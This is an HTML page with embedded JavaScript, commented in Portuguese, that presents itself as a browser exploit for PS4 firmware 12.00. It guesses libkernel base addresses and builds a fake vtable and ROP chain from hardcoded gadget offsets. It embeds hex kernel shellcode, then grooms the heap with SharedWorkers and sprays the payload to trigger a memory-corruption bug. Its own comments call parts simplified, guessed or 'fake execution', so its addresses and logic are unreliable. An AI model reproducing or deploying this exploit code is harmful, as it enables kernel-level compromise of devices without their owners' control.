<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 Bruteforce ROP</title>
   
</head>
<body>

    <h1>PS4 12.00 - ROP BRUTEFORCE</h1>
    <h3>Estratégia: Chutar Base da LibKernel até acertar</h3>
    <div id="status">Pronto.</div>
    <div id="log"></div>
    <br>
    <button onclick="start_brute()">INICIAR ROLETA RUSSA</button>

    <script>
        function log(msg) {
            document.getElementById("log").innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // SEUS GADGETS (Extraídos do 1200_libkernel_sys.sprx.elf)
        var GADGETS = {
            pop_rdi: 0x2FEB5,
            sys_mmap: 0x7500, // Syscall 477
            // Endereço de um lugar seguro para escrever (Data Segment)
            // Chute: Offset alto na libkernel
            data_offset: 0x100000 
        };

        // Shellcode de Notificação
        var shellcode_hex = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3";

        function get_bytes() {
            var b = new Uint8Array(shellcode_hex.length/2);
            for(var i=0; i<shellcode_hex.length; i+=2) b[i/2] = parseInt(shellcode_hex.substr(i,2), 16);
            return b;
        }

        // =================================================================
        // CONSTRUTOR DE ROP CHAIN
        // =================================================================
        function build_payload(base_addr_str) {
            var base = BigInt(base_addr_str);
            var size = 0x400;
            var buffer = new Uint32Array(size / 4);
            var view = new DataView(buffer.buffer);
            var code = get_bytes();

            // Gadgets Reais
            var pop_rdi = base + BigInt(GADGETS.pop_rdi);
            var sys_mmap = base + BigInt(GADGETS.sys_mmap);
            var writable = base + BigInt(GADGETS.data_offset);

            // --- FAKE VTABLE ---
            // Aponta para o início da nossa ROP Chain (Offset 0x20)
            for(var i=0; i<32; i+=8) view.setBigUint64(i, base + 0x20n, true);

            // --- ROP CHAIN (Início em 0x20) ---
            var rop = 0x20;
            
            // 1. mmap(addr=0, len=0x4000, prot=RWX, flags=ANON, fd=-1, off=0)
            // Simplificado: Vamos tentar apenas pular para o shellcode se mmap falhar
            
            // Colocamos o shellcode logo após a chain
            var sc_offset = 0x100;
            
            // FAKE EXECUTION:
            // Vamos encher com o endereço do GADGET DE PULO (pop rdi) para testar controle
            for(var k=32; k<sc_offset; k+=8) {
                view.setBigUint64(k, pop_rdi, true);
            }

            // Shellcode no final
            for(var j=0; j<code.length; j++) {
                if(sc_offset+j < buffer.byteLength) 
                    view.setUint8(sc_offset+j, code[j]);
            }

            return buffer;
        }

        // =================================================================
        // EXECUÇÃO
        // =================================================================
        var workers = [];
        var bases_to_try = [
            "0x800000000", "0x800004000", "0x800010000", // Tentativas comuns
            "0x880000000", "0x900000000", "0x200000000"
        ];

        async function start_brute() {
            var current_base = bases_to_try[0]; // Tente mudar este índice manualmente se falhar
            log(`Tentando Base: ${current_base}`);
            
            var payload = build_payload(current_base);

            // Grooming
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
            }

            // Trigger
            var count = 0;
            var it = setInterval(() => {
                if(count >= 4) {
                    clearInterval(it);
                    
                    var v = workers.pop();
                    v.port.close();
                    
                    // Spray
                    var spray = [];
                    for(var k=0; k<10000; k++) {
                        spray.push(new Uint32Array(payload));
                    }
                    
                    try { v.port.postMessage("PWN"); } catch(e){}
                    
                    log("Aguardando reação...");
                    return;
                }
                
                let w = new SharedWorker("data:text/javascript,1", "v"+count);
                w.port.start();
                workers.push(w);
                count++;
            }, 150);
        }
    </script>
</body>
</html>
